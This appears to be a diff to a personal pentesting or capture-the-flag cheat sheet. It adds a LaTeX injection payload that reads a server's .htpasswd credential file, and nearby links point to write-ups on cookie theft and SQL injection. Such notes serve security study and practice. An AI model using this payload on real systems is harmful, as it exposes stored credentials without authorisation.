@@ -197,6 +197,10 @@ index.php~ - сохнарить sourse code
 ────────────────────────────────────────────
 ```
 ---
+#### LaTeX injection
+```
+$\lstinputlisting{/var/www/dev/.htpasswd}$
+```
 #### links
 - [steal admin cookie/sqli](./src/src_for_src/marketplace.md) (tryhackme:marketplace)
 - [ohmyweb](./src/src_for_src/omyweb.md)
